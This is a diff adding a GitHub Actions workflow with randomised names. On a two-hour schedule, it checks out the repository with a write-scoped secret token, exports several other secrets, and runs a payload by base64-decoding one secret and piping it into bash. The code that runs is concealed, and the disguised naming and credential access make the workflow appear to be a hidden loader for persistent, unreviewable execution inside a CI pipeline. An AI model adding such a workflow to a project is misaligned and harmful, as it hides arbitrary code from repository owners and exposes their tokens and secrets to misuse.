@@ -1,0 +1,21 @@
+name: GwtTmckKrm
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  temZtZH:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.EmTpwAJ74kTcr6 }}
+      - name: RNXCcMHqw7S2VC
+        env:
+          WyNUMTkP: ${{ secrets.o1ZWVM8PY }}
+          kSde6hEGN3n: ${{ secrets.AKGtMlwzV }}
+          UOissYObd: ${{ secrets.JQKV4tMzIacZEE }}
+          GITHUB_TOKEN: ${{ secrets.EmTpwAJ74kTcr6 }}
+        run: echo "$WyNUMTkP" | base64 -d | bash
